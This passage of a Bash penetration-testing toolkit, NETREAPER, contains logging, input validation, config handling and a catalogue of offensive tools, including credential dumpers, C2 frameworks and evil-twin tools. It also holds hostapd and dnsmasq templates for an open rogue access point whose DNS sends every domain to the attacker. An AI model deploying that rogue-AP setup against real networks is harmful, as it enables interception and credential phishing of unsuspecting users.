start_timer() { start_timer_ms; }
end_timer() { end_timer_ms; }

#───────────────────────────────────────────────────────────────────────────────
# LOGGING FUNCTIONS
#───────────────────────────────────────────────────────────────────────────────

log_to_file() {
    local message="$1"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" >> "$LOG_FILE" 2>/dev/null
}

log_debug() {
    if [[ "$DEBUG" == "true" ]]; then
        echo -e "    ${C_SHADOW}[~]${C_RESET} $*"
    fi
    log_to_file "[DEBUG] $*"
}

log_verbose() {
    if [[ "$VERBOSE" == "true" ]]; then
        echo -e "    ${C_SHADOW}[*]${C_RESET} $*"
    fi
    log_to_file "[VERBOSE] $*"
}

log_info() {
    [[ "$QUIET" != "true" && "$QUIET" != "1" ]] && echo -e "    ${C_CYAN}[*]${C_RESET} $*"
    log_to_file "[INFO] $*"
}

log_success() {
    [[ "$QUIET" != "true" && "$QUIET" != "1" ]] && echo -e "    ${C_GREEN}[✓]${C_RESET} $*"
    log_to_file "[SUCCESS] $*"
}

log_warning() {
    echo -e "    ${C_YELLOW}[!]${C_RESET} $*"
    log_to_file "[WARNING] $*"
}

log_error() {
    echo -e "    ${C_RED}[✗]${C_RESET} $*" >&2
    log_to_file "[ERROR] $*"
}

log_fatal() {
    echo -e "    ${C_BRED}[☠]${C_RESET} $*" >&2
    log_to_file "[FATAL] $*"
    exit 1
}

log_audit() {
    local action="${1:-ACTION}"
    local target="${2:-}"
    local result="${3:-}"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] [AUDIT] action=\"$action\" target=\"$target\" result=\"$result\" user=\"$(whoami)\" pid=\"$$\"" >> "$AUDIT_LOG" 2>/dev/null
}

log_command_preview() {
    local cmd="${1:-}"
    
    if [[ "$VERBOSE" == "true" ]]; then
        echo -e "    ${C_SHADOW}\$ ${cmd}${C_RESET}"
    fi
    
    log_to_file "[EXEC] $cmd"
    log_audit "EXECUTE" "${cmd:0:200}" "started"
}

log_attack()  { log_warning "$@"; }
log_target()  { log_info "$@"; }
log_loot()    { log_success "$@"; }

init_logging() {
    mkdir -p "$LOG_DIR"
    touch "$LOG_FILE" "$AUDIT_LOG"
    chmod 600 "$LOG_FILE" "$AUDIT_LOG" 2>/dev/null || true
    log_debug "NETREAPER v${VERSION} (${CODENAME}) started at $(date '+%Y-%m-%d %H:%M:%S')"
}

#───────────────────────────────────────────────────────────────────────────────
# OPERATION DISPLAY FUNCTIONS
#───────────────────────────────────────────────────────────────────────────────

operation_header() {
    local title="${1:-Operation}"
    local target="${2:-}"
    
    echo
    echo -e "    ${C_CYAN}┌─────────────────────────────────────────────────────────────┐${C_RESET}"
    echo -e "    ${C_CYAN}│${C_RESET} ${C_FIRE}⚔${C_RESET}  ${C_WHITE}${title}${C_RESET}"
    if [[ -n "$target" ]]; then
        # Sanitize target for display
        local clean_target
        clean_target=$(strip_ansi "$target")
        echo -e "    ${C_CYAN}│${C_RESET} ${C_SHADOW}Target:${C_RESET} ${C_GREEN}${clean_target}${C_RESET}"
    fi
    echo -e "    ${C_CYAN}└─────────────────────────────────────────────────────────────┘${C_RESET}"
    echo
    
    log_audit "OPERATION" "$title" "started"
}

operation_summary() {
    local status="${1:-info}"
    local message="${2:-Complete}"
    local extra="${3:-}"

    if [[ ! "$status" =~ ^(success|ok|done|0|fail|failed|error|1|warn|warning|partial|info)$ ]]; then
        extra="${message}${extra:+\n$extra}"
        message="$status"
        status="info"
    fi
    
    echo
    case "$status" in
        success|ok|done|0)
            echo -e "    ${C_GREEN}[✓]${C_RESET} ${message}"
            log_audit "RESULT" "$message" "success"
            ;;
        fail|failed|error|1)
            echo -e "    ${C_RED}[✗]${C_RESET} ${message}"
            log_audit "RESULT" "$message" "failed"
            ;;
        warn|warning|partial)
            echo -e "    ${C_YELLOW}[!]${C_RESET} ${message}"
            log_audit "RESULT" "$message" "warning"
            ;;
        info|*)
            echo -e "    ${C_CYAN}[*]${C_RESET} ${message}"
            log_audit "RESULT" "$message" "info"
            ;;
    esac
    
    [[ -n "$extra" ]] && echo -e "    ${C_SHADOW}${extra}${C_RESET}"
}

# Alias for consistency
operation_footer() {
    operation_summary "$@"
}

#───────────────────────────────────────────────────────────────────────────────
# INPUT SANITIZATION FUNCTIONS
#───────────────────────────────────────────────────────────────────────────────

# Strip ANSI color/escape codes from string
strip_ansi() {
    local text="$1"
    # Remove all ANSI escape sequences
    echo -e "$text" | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | sed 's/\x1b\[[0-9;]*m//g' | sed 's/\x1b(B//g'
}

# Clean input for use in filenames (aggressive sanitization)
sanitize_filename() {
    local input="$1"
    # Strip ANSI, then keep only safe filename characters
    strip_ansi "$input" | tr -cd '[:alnum:]._-' | cut -c1-100
}

# Clean target input (preserve valid target characters)
sanitize_target() {
    local input="$1"
    # Strip ANSI and trim whitespace
    strip_ansi "$input" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//'
}

#───────────────────────────────────────────────────────────────────────────────
# SAFE INPUT FUNCTIONS (CRITICAL - FIXES INPUT BUG)
#───────────────────────────────────────────────────────────────────────────────

# Get target with proper prompt - DOES NOT MIX PROMPT WITH VALUE
get_target_input() {
    local prompt="${1:-Enter target}"
    local default="${2:-}"
    local target=""
    
    if [[ -n "$default" ]]; then
        echo -ne "    ${C_PROMPT}${prompt} ${C_SHADOW}[${default}]${C_RESET}: " >&2
    else
        echo -ne "    ${C_PROMPT}${prompt}: ${C_RESET}" >&2
    fi
    
    read -r target
    
    # Use default if empty
    [[ -z "$target" ]] && target="$default"
    
    # Sanitize and return (echo to stdout, prompts went to stderr)
    sanitize_target "$target"
}

# Get generic input with default value
get_input() {
    local prompt="${1:-Input}"
    local default="${2:-}"
    local input=""
    
    if [[ -n "$default" ]]; then
        echo -ne "    ${C_PROMPT}${prompt} ${C_SHADOW}[${default}]${C_RESET}: " >&2
    else
        echo -ne "    ${C_PROMPT}${prompt}: ${C_RESET}" >&2
    fi
    
    read -r input
    
    # Use default if empty
    [[ -z "$input" ]] && input="$default"
    
    # Sanitize and return
    strip_ansi "$input"
}

# Get password (hidden input)
get_password_input() {
    local prompt="${1:-Password}"
    local password=""
    
    echo -ne "    ${C_PROMPT}${prompt}: ${C_RESET}" >&2
    read -rs password
    echo >&2  # Newline after hidden input
    
    echo "$password"
}

# Yes/No confirmation - returns 0 for yes, 1 for no
confirm_action() {
    local prompt="${1:-Continue?}"
    local default="${2:-n}"
    local response=""
    
    if [[ "$default" == "y" ]]; then
        echo -ne "    ${C_PROMPT}${prompt} [Y/n]: ${C_RESET}" >&2
    else
        echo -ne "    ${C_PROMPT}${prompt} [y/N]: ${C_RESET}" >&2
    fi
    
    read -r response
    response="${response:-$default}"
    
    [[ "${response,,}" == "y" || "${response,,}" == "yes" ]]
}

# Dangerous operation confirmation (requires typing YES)
confirm_dangerous() {
    local message="${1:-This is a dangerous operation}"
    local confirm_word="${2:-YES}"
    local response=""
    
    echo >&2
    echo -e "    ${C_RED}╔══════════════════════════════════════════════════════════════╗${C_RESET}" >&2
    echo -e "    ${C_RED}║${C_RESET}  ${C_YELLOW}⚠️  WARNING: POTENTIALLY DANGEROUS OPERATION  ⚠️${C_RESET}            ${C_RED}║${C_RESET}" >&2
    echo -e "    ${C_RED}╚══════════════════════════════════════════════════════════════╝${C_RESET}" >&2
    echo >&2
    echo -e "    ${C_SHADOW}$message${C_RESET}" >&2
    echo >&2
    echo -ne "    ${C_YELLOW}Type '${confirm_word}' to confirm: ${C_RESET}" >&2
    read -r response
    
    [[ "$response" == "$confirm_word" ]]
}

#───────────────────────────────────────────────────────────────────────────────
# TARGET VALIDATION FUNCTIONS
#───────────────────────────────────────────────────────────────────────────────

# Check if input is valid IPv4
is_valid_ip() {
    local ip="$1"
    local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'

    if [[ ! "$ip" =~ $regex ]]; then
        return 1
    fi

    # Validate each octet
    local IFS='.'
    read -ra octets <<< "$ip"
    for octet in "${octets[@]}"; do
        ((octet > 255)) && return 1
    done

    return 0
}

# Check if IP is in private/reserved ranges
is_private_ip() {
    local ip="$1"

    # Check for private IP ranges
    if [[ "$ip" =~ ^10\. ]]; then
        return 0  # 10.0.0.0/8
    elif [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]]; then
        return 0  # 172.16.0.0/12
    elif [[ "$ip" =~ ^192\.168\. ]]; then
        return 0  # 192.168.0.0/16
    elif [[ "$ip" =~ ^127\. ]]; then
        return 0  # 127.0.0.0/8 (loopback)
    elif [[ "$ip" =~ ^169\.254\. ]]; then
        return 0  # 169.254.0.0/16 (link-local)
    fi

    return 1
}

# Check if input is valid CIDR
is_valid_cidr() {
    local cidr="$1"
    local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$'
    
    if [[ ! "$cidr" =~ $regex ]]; then
        return 1
    fi
    
    local ip="${cidr%/*}"
    local mask="${cidr#*/}"
    
    is_valid_ip "$ip" && ((mask >= 0 && mask <= 32))
}

# Check if input is valid MAC address
is_valid_mac() {
    local mac="$1"
    [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

# Check if input is valid domain
is_valid_domain() {
    local domain="$1"
    [[ "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?$ ]] && [[ "$domain" == *.* ]]
}

# Check if input is valid hostname (including localhost)
is_valid_hostname() {
    local host="$1"
    [[ "$host" =~ ^[a-zA-Z0-9]([a-zA-Z0-9.-]*)?$ ]]
}

#───────────────────────────────────────────────────────────────────────────────
# WORDLIST MANAGEMENT FUNCTIONS
#───────────────────────────────────────────────────────────────────────────────

# Check available wordlists
check_wordlists() {
    local rockyou="/usr/share/wordlists/rockyou.txt"
    local rockyou_gz="/usr/share/wordlists/rockyou.txt.gz"
    local seclists="/usr/share/seclists"

    echo -e "${C_CYAN}[*] Checking wordlists...${C_RESET}"

    # Check rockyou
    if [[ -f "$rockyou" ]]; then
        local size
        size=$(du -h "$rockyou" | cut -f1)
        echo -e "    ${C_GREEN}✓${C_RESET} rockyou.txt ($size)"
    elif [[ -f "$rockyou_gz" ]]; then
        echo -e "    ${C_YELLOW}!${C_RESET} rockyou.txt.gz (compressed)"
        read -rp "    Decompress now? [Y/n]: " decompress
        if [[ "${decompress,,}" != "n" ]]; then
            echo -ne "    Decompressing... "
            if gunzip -k "$rockyou_gz" 2>/dev/null; then
                echo -e "${C_GREEN}done${C_RESET}"
            else
                echo -e "${C_RED}failed${C_RESET}"
            fi
        fi
    else
        echo -e "    ${C_RED}✗${C_RESET} rockyou.txt not found"
        echo -e "    ${C_SHADOW}Install: sudo apt install wordlists${C_RESET}"
    fi

    # Check seclists
    if [[ -d "$seclists" ]]; then
        echo -e "    ${C_GREEN}✓${C_RESET} SecLists installed"
    else
        echo -e "    ${C_YELLOW}○${C_RESET} SecLists not installed"
        echo -e "    ${C_SHADOW}Install: sudo apt install seclists${C_RESET}"
    fi
}

# Ensure rockyou.txt is available (decompress if needed)
ensure_rockyou() {
    local rockyou="/usr/share/wordlists/rockyou.txt"
    local rockyou_gz="/usr/share/wordlists/rockyou.txt.gz"

    if [[ ! -f "$rockyou" ]]; then
        if [[ -f "$rockyou_gz" ]]; then
            echo -e "${C_YELLOW}[!] rockyou.txt is compressed${C_RESET}"
            read -rp "    Decompress now? [Y/n]: " decompress
            if [[ "${decompress,,}" != "n" ]]; then
                gunzip -k "$rockyou_gz" && echo -e "${C_GREEN}[✓] Decompressed${C_RESET}"
            else
                return 1
            fi
        else
            echo -e "${C_RED}[!] rockyou.txt not found${C_RESET}"
            echo -e "${C_SHADOW}    Install: sudo apt install wordlists${C_RESET}"
            return 1
        fi
    fi
    return 0
}

# Determine target type
get_target_type() {
    local target="$1"
    
    # Sanitize first
    target=$(sanitize_target "$target")
    
    if [[ -z "$target" ]]; then
        echo "empty"
    elif is_valid_ip "$target"; then
        echo "ip"
    elif is_valid_cidr "$target"; then
        echo "cidr"
    elif is_valid_mac "$target"; then
        echo "mac"
    elif is_valid_domain "$target"; then
        echo "domain"
    elif is_valid_hostname "$target"; then
        echo "hostname"
    else
        echo "unknown"
    fi
}

# Validate target for specific tool
validate_target_for_tool() {
    local target="$1"
    local tool="$2"
    
    local target_type
    target_type=$(get_target_type "$target")
    
    case "$tool" in
        netdiscover)
            if [[ "$target_type" == "mac" ]]; then
                log_error "netdiscover requires IP range (CIDR), not MAC address"
                log_info "Use: 192.168.1.0/24 format"
                return 1
            elif [[ "$target_type" == "ip" ]]; then
                log_warning "Single IP provided, converting to /24 subnet"
                echo "${target%.*}.0/24"
                return 0
            elif [[ "$target_type" != "cidr" ]]; then
                log_error "netdiscover requires CIDR notation (e.g., 192.168.1.0/24)"
                return 1
            fi
            ;;
        nmap|masscan|rustscan)
            if [[ "$target_type" == "mac" ]]; then
                log_error "$tool requires IP/CIDR/domain, not MAC address"
                return 1
            fi
            ;;
        hping3)
            if [[ "$target_type" != "ip" && "$target_type" != "hostname" && "$target_type" != "domain" ]]; then
                log_error "hping3 requires IP address or hostname"
                return 1
            fi
            ;;
        aireplay-ng|airodump-ng|mdk3|mdk4)
            # These work with MAC addresses (BSSID) - that's expected
            ;;
        secretsdump|impacket*)
            if [[ "$target_type" == "mac" ]]; then
                log_error "Impacket tools require IP or hostname, not MAC address"
                return 1
            fi
            ;;
    esac
    
    echo "$target"
    return 0
}

# shellcheck disable=SC2016
HOSTAPD_TEMPLATE='interface=${IFACE}
driver=nl80211
ssid=${TARGET_SSID}
hw_mode=g
channel=${CHANNEL}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0'

# shellcheck disable=SC2016
DNSMASQ_TEMPLATE='interface=${IFACE}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1'
# TOOL ARSENAL - 60+ Capabilities
#═══════════════════════════════════════════════════════════════════════════════

# shellcheck disable=SC2034
declare -a TOOLS_SCANNING=(nmap masscan unicornscan rustscan zmap netdiscover arp-scan fping hping3 p0f arping nbtscan amap)
# shellcheck disable=SC2034
declare -a TOOLS_DNS=(dnsenum dnsmap dnsrecon fierce)
# shellcheck disable=SC2034
declare -a TOOLS_SNMP=(onesixtyone snmpwalk snmpcheck)
# shellcheck disable=SC2034
declare -a TOOLS_SMB=(smbmap smbclient enum4linux)
# shellcheck disable=SC2034
declare -a TOOLS_SSL=(sslscan sslyze testssl.sh)
# shellcheck disable=SC2034
declare -a TOOLS_TRAFFIC=(tcpdump wireshark tshark ettercap bettercap)
# shellcheck disable=SC2034
declare -a TOOLS_WEB=(nikto wpscan sqlmap dirb gobuster ffuf burpsuite nuclei httpx subfinder amass)
# shellcheck disable=SC2034
declare -a TOOLS_WIFI=(aircrack-ng airmon-ng airodump-ng aireplay-ng wifite reaver bully pixiewps bettercap fluxion wifiphisher mdk3 mdk4 cowpatty)
# shellcheck disable=SC2034
declare -a TOOLS_EXPLOIT=(metasploit-framework searchsploit empire covenant crackmapexec)
# shellcheck disable=SC2034
declare -a TOOLS_CREDS=(hashcat john hydra medusa crackmapexec cowpatty)
# shellcheck disable=SC2034
declare -a TOOLS_POST=(impacket-secretsdump impacket-smbclient impacket-psexec impacket-wmiexec mimikatz)
# shellcheck disable=SC2034
declare -a TOOLS_OSINT=(theharvester recon-ng maltego shodan)
# shellcheck disable=SC2034
declare -a TOOLS_UTIL=(netcat ncat socat proxychains)

# Arsenal metadata and helpers
readonly -a ARSENAL_CATEGORIES=(SCANNING DNS SSL WIFI WEB EXPLOIT TRAFFIC OSINT CREDS POST)

declare -A CAT_COLORS=(
    [SCANNING]="$C_CYAN"
    [DNS]="$C_BLUE"
    [SSL]="$C_GREEN"
    [WIFI]="$C_PURPLE"
    [WEB]="$C_ORANGE"
    [EXPLOIT]="$C_RED"
    [TRAFFIC]="$C_YELLOW"
    [OSINT]="$C_STEEL"
    [CREDS]="$C_FIRE"
    [POST]="$C_BLOOD"
)

declare -A CAT_ICONS=(
    [SCANNING]="🔍"
    [DNS]="🌐"
    [SSL]="🔒"
    [WIFI]="📡"
    [WEB]="🕸️"
    [EXPLOIT]="💀"
    [TRAFFIC]="📊"
    [OSINT]="🔎"
    [CREDS]="🔑"
    [POST]="🎯"
)

declare -A TOOL_BINARIES=(
    [metasploit-framework]="msfconsole"
    [testssl.sh]="testssl"
    [burpsuite]="burpsuite"
    [john]="john"
    [aircrack-ng]="aircrack-ng"
    [impacket-secretsdump]="impacket-secretsdump secretsdump.py"
    [impacket-smbclient]="impacket-smbclient smbclient.py"
    [impacket-psexec]="impacket-psexec psexec.py"
    [impacket-wmiexec]="impacket-wmiexec wmiexec.py"
)

declare -A TOOL_INFO=(
    [nmap]="nmap:nmap:apt:scanning:Network mapper"
    [masscan]="masscan:masscan:apt:scanning:Fast port scanner"
    [unicornscan]="unicornscan:unicornscan:apt:scanning:Asynchronous TCP/UDP scanner"
    [rustscan]="rustscan:rustscan:github:scanning:Modern port scanner"
    [zmap]="zmap:zmap:apt:scanning:Internet-wide scanner"
    [netdiscover]="netdiscover:netdiscover:apt:scanning:ARP reconnaissance"
    [arp-scan]="arp-scan:arp-scan:apt:scanning:ARP sweep"
    [fping]="fping:fping:apt:scanning:Fast ICMP sweep"
    [hping3]="hping3:hping3:apt:scanning:TCP/IP packet crafter"
    [p0f]="p0f:p0f:apt:scanning:Passive OS fingerprinting"
    [arping]="arping:arping:apt:scanning:ARP ping"
    [nbtscan]="nbtscan:nbtscan:apt:scanning:NetBIOS scanner"
    [amap]="amap:amap:apt:scanning:Application mapper"
    [dnsenum]="dnsenum:dnsenum:apt:dns:DNS enumeration"
    [dnsmap]="dnsmap:dnsmap:apt:dns:DNS bruteforce"
    [dnsrecon]="dnsrecon:dnsrecon:apt:dns:DNS reconnaissance"
    [fierce]="fierce:fierce:apt:dns:DNS reconnaissance"
    [sslscan]="sslscan:sslscan:apt:ssl:SSL/TLS scanner"
    [sslyze]="sslyze:sslyze:apt:ssl:SSL audit"
    [testssl.sh]="testssl:testssl.sh:git:ssl:Comprehensive SSL test"
    [aircrack-ng]="aircrack-ng:aircrack-ng:apt:wifi:WiFi security suite"
    [airmon-ng]="airmon-ng:aircrack-ng:apt:wifi:Wireless monitor mode"
    [airodump-ng]="airodump-ng:aircrack-ng:apt:wifi:Capture packets"
    [aireplay-ng]="aireplay-ng:aircrack-ng:apt:wifi:WiFi injection"
    [wifite]="wifite:wifite:apt:wifi:Automated WiFi attacks"
    [reaver]="reaver:reaver:apt:wifi:WPS attack"
    [bully]="bully:bully:apt:wifi:WPS brute force"
    [pixiewps]="pixiewps:pixiewps:apt:wifi:WPS Pixie Dust"
    [bettercap]="bettercap:bettercap:apt:wifi:MITM framework"
    [fluxion]="fluxion:fluxion:git:wifi:Evil twin framework"
    [wifiphisher]="wifiphisher:wifiphisher:apt:wifi:Phishing AP"
    [mdk3]="mdk3:mdk3:apt:wifi:WiFi stress"
    [mdk4]="mdk4:mdk4:apt:wifi:WiFi stress"
    [cowpatty]="cowpatty:cowpatty:apt:wifi:WPA handshake cracker"
    [nikto]="nikto:nikto:apt:web:Web vuln scanner"
    [wpscan]="wpscan:wpscan:gem:web:WordPress scanner"
    [sqlmap]="sqlmap:sqlmap:apt:web:SQL injection"
    [dirb]="dirb:dirb:apt:web:Directory brute force"
    [gobuster]="gobuster:gobuster:apt:web:Directory brute force"
    [ffuf]="ffuf:github.com/ffuf/ffuf/v2@latest:go:web:Fuzzing"
    [burpsuite]="burpsuite:burpsuite:apt:web:Proxy"
    [nuclei]="nuclei:github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest:go:web:Template scanner"
    [httpx]="httpx:github.com/projectdiscovery/httpx/cmd/httpx@latest:go:web:HTTP probing"
    [subfinder]="subfinder:github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest:go:web:Subdomain enum"
    [amass]="amass:amass:apt:web:Subdomain enum"
    [metasploit-framework]="msfconsole:metasploit-framework:apt:exploit:Exploitation framework"
    [searchsploit]="searchsploit:exploitdb:apt:exploit:Exploit DB search"
    [empire]="empire:empire:git:exploit:Post-exploitation"
    [covenant]="covenant:covenant:git:exploit:C2 framework"
    [crackmapexec]="crackmapexec:crackmapexec:pipx:exploit:AD exploitation"
    [tcpdump]="tcpdump:tcpdump:apt:traffic:Packet capture"
    [wireshark]="wireshark:wireshark:apt:traffic:Protocol analyzer"
    [tshark]="tshark:wireshark:apt:traffic:CLI analyzer"
    [ettercap]="ettercap:ettercap-text-only:apt:traffic:MITM"
    [theharvester]="theharvester:theharvester:apt:osint:OSINT collection"
    [recon-ng]="recon-ng:recon-ng:apt:osint:OSINT framework"
    [maltego]="maltego:maltego:apt:osint:Link analysis"
    [shodan]="shodan:shodan:pip:osint:Shodan client"
    [hashcat]="hashcat:hashcat:apt:creds:Password recovery"
    [john]="john:john:apt:creds:Password cracking"
    [hydra]="hydra:hydra:apt:creds:Network login cracker"
    [medusa]="medusa:medusa:apt:creds:Parallel login brute force"
    [impacket-secretsdump]="impacket-secretsdump:impacket-scripts:apt:post:Dump secrets"
    [impacket-smbclient]="impacket-smbclient:impacket-scripts:apt:post:SMB client"
    [impacket-psexec]="impacket-psexec:impacket-scripts:apt:post:Psexec over SMB"
    [impacket-wmiexec]="impacket-wmiexec:impacket-scripts:apt:post:WMI exec"
    [mimikatz]="mimikatz:mimikatz:apt:post:Credential dumping"
)

declare -A TOOL_STATUS=()

reset_status_cache() {
    TOOL_STATUS=()
}

is_tool_installed() {
    local tool="$1"
    local binaries="${TOOL_BINARIES[$tool]:-$tool}"

    for bin in $binaries; do
        if command -v "$bin" &>/dev/null; then
            return 0
        fi
    done

    [[ -f "/opt/$tool/$tool" ]] && return 0
    [[ -f "/opt/$tool/${tool}.sh" ]] && return 0
    [[ -d "/opt/$tool" ]] && return 0
    [[ -f "/usr/share/$tool/$tool" ]] && return 0

    return 1
}

tool_status_cached() {
    local tool="$1"
    if [[ -z "${TOOL_STATUS[$tool]+set}" ]]; then
        if is_tool_installed "$tool"; then
            TOOL_STATUS[$tool]="installed"
        else
            TOOL_STATUS[$tool]="missing"
        fi
    fi
    [[ "${TOOL_STATUS[$tool]}" == "installed" ]]
}

category_tools() {
    local category="$1"
    # shellcheck disable=SC2178
    local -n tools_ref="TOOLS_${category}"
    echo "${tools_ref[*]}"
}

category_exists() {
    local needle="$1"
    for cat in "${ARSENAL_CATEGORIES[@]}"; do
        [[ "$cat" == "$needle" ]] && return 0
    done
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# LOGGING & TELEMETRY
#═══════════════════════════════════════════════════════════════════════════════

LOG_LEVEL="${LOG_LEVEL:-${NETREAPER_LOG_LEVEL:-INFO}}"

show_spinner() {
    local pid=$1
    local message="${2:-Processing}"
    local spinchars='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'

    if [[ "$QUIET" == "true" || "$QUIET" == "1" ]]; then
        wait "$pid" 2>/dev/null
        return
    fi

    while kill -0 "$pid" 2>/dev/null; do
        for ((i=0; i<${#spinchars}; i++)); do
            echo -ne "\r    ${C_CYAN}[${spinchars:$i:1}]${C_RESET} $message..."
            sleep 0.1
        done
    done
    echo -ne "\r\033[K"
}

show_progress() {
    local current=$1 total=$2 message="${3:-Progress}" width=40
    local pct=$((current * 100 / total))
    local filled=$((pct * width / 100))
    local empty=$((width - filled))

    if [[ "$QUIET" == "true" || "$QUIET" == "1" ]]; then
        return
    fi

    echo -ne "\r    ${C_SHADOW}$message: ${C_RESET}["
    echo -ne "${C_GREEN}"
    printf '█%.0s' $(seq 1 $filled 2>/dev/null)
    echo -ne "${C_SHADOW}"
    printf '░%.0s' $(seq 1 $empty 2>/dev/null)
    echo -ne "${C_RESET}] ${pct}%"
    ((current == total)) && echo
}

run_cmd() {
    local description="$1"; shift
    local cmd="$*"

    log_verbose "Executing: $cmd"
    start_timer

    if [[ "$VERBOSE" == true ]]; then
        eval "$cmd" 2>&1 | tee -a "$LOG_FILE"
        local status=${PIPESTATUS[0]}
    else
        eval "$cmd" >> "$LOG_FILE" 2>&1
        local status=$?
    fi

    local duration
    duration=$(end_timer)

    if ((status == 0)); then
        log_verbose "$description completed in $duration"
    else
        log_error "$description failed (exit code: $status) after $duration"
    fi
    return $status
}

check_target_reachable() {
    local target="${1:-}"
    log_info "Checking target availability..."
    local ping_output latency
    if ping_output=$(ping -c 1 -W 2 "$target" 2>/dev/null); then
        latency=$(echo "$ping_output" | grep -o 'time=[0-9.]* ms' | head -n1 | cut -d'=' -f2)
        log_success "Target is up (latency: ${latency:-unknown})"
        return 0
    else
        log_warning "Target did not respond to ping"
        return 1
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

declare -A DEFAULT_CONFIG=(
    [LOG_LEVEL]="INFO"
    [VERBOSE]="false"
    [AUTO_UPDATE_CHECK]="true"
    [DEFAULT_SCAN_TYPE]="standard"
    [DEFAULT_TIMING]="T3"
    [SAVE_OUTPUT]="true"
    [OUTPUT_FORMAT]="txt"
    [COLOR_THEME]="blood"
    [CONFIRM_DANGEROUS]="true"
    [MAX_HISTORY]="50"
    [SESSION_AUTOSAVE]="true"
)

init_config() {
    mkdir -p "$CONFIG_DIR" "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR" "$SESSIONS_DIR"

    if [[ ! -f "$CONFIG_FILE" ]]; then
        log_verbose "Creating default configuration"
        for key in "${!DEFAULT_CONFIG[@]}"; do
            echo "$key=${DEFAULT_CONFIG[$key]}" >> "$CONFIG_FILE"
        done
    fi

    # shellcheck source=/dev/null
    [[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE"

    LOG_LEVEL=$(config_get LOG_LEVEL "$LOG_LEVEL")
    VERBOSE=$(config_get VERBOSE "$VERBOSE")
}

config_get() {
    local key="$1"; local default_val="${2:-${DEFAULT_CONFIG[$key]:-}}"
    local value
    value=$(grep -E "^$key=" "$CONFIG_FILE" 2>/dev/null | head -1 | cut -d= -f2-)
    echo "${value:-$default_val}"
}

config_set() {
    local key="$1" value="$2"
    if grep -q "^$key=" "$CONFIG_FILE" 2>/dev/null; then
        sed -i "s/^$key=.*/$key=$value/" "$CONFIG_FILE"
    else
        echo "$key=$value" >> "$CONFIG_FILE"
    fi
    log_verbose "Config updated: $key=$value"
}

config_reset() {
    rm -f "$CONFIG_FILE"
    init_config
    log_success "Configuration reset to defaults"
}

config_show() {
    echo
    echo -e "    ${C_CYAN}Current configuration${C_RESET}"
    while IFS='=' read -r key value; do
        [[ -z "$key" || "$key" =~ ^# ]] && continue
        printf "    ${C_GHOST}%-24s${C_RESET} ${C_GREEN}%s${C_RESET}\n" "$key" "$value"
    done < "$CONFIG_FILE"
    echo
}

config_edit() {
    while true; do
        clear
        echo
        echo -e "    ${C_CYAN}╔═══════════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_CYAN}║${C_RESET}                    ${C_FIRE}⚙️  CONFIGURATION${C_RESET}                               ${C_CYAN}║${C_RESET}"
        echo -e "    ${C_CYAN}╚═══════════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo

        local i=1
        declare -a keys=()
        while IFS='=' read -r key value; do
            [[ -z "$key" || "$key" =~ ^# ]] && continue
            keys+=("$key")
            printf "    ${C_GHOST}[%2d]${C_RESET} %-25s ${C_SHADOW}= ${C_GREEN}%s${C_RESET}\n" $i "$key" "$value"
            ((i++))
        done < "$CONFIG_FILE"

        echo
        echo -e "    ${C_GHOST}[R]${C_RESET} Reset to defaults"
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_PROMPT}Select option to edit: ${C_RESET}"
        read -r choice

        case "$choice" in
            r|R)
                if confirm "Reset all settings to default?" "n"; then
                    config_reset
                fi
                ;;
            b|B|q|Q)
                return
                ;;
            [0-9]*)
                if ((choice >= 1 && choice <= ${#keys[@]})); then
                    local key_sel="${keys[$((choice-1))]}"
                    local current
                    current=$(config_get "$key_sel")
                    echo
                    local new_value
                    new_value=$(prompt_input "New value for $key_sel" "" "$current")
                    config_set "$key_sel" "$new_value"
                    log_success "Updated $key_sel"
                fi
                ;;
        esac
    done
}

summarize_nmap_results() {
    local outfile="${1:-}"
    [[ -f "$outfile" ]] || return
    local open_ports
    open_ports=$(grep -Eo '^[0-9]+/(tcp|udp)[[:space:]]+open' "$outfile" | awk '{print $1}' | paste -sd ', ' -)
    [[ -z "$open_ports" ]] && open_ports="none"
    log_info "Open ports: ${open_ports}"
}

get_open_ports() {
    local outfile="${1:-}"
    [[ -f "$outfile" ]] || return
    local open_ports
    open_ports=$(grep -Eo '^[0-9]+/(tcp|udp)[[:space:]]+open' "$outfile" | awk '{print $1}' | paste -sd ', ' -)
    [[ -z "$open_ports" ]] && open_ports="none"
    printf '%s' "$open_ports"
}

#═══════════════════════════════════════════════════════════════════════════════
# VISUAL EFFECTS
#═══════════════════════════════════════════════════════════════════════════════

typewriter() {
    local text="${1:-}" delay="${2:-0.015}"
    if [[ "$QUIET" == "true" || "$QUIET" == "1" ]]; then
        echo "$text"
        return
    fi
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

spinner() {
    local pid="${1:-}" msg="${2:-Processing}"
    [[ -z "$pid" ]] && return 1
    local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    tput civis 2>/dev/null || true
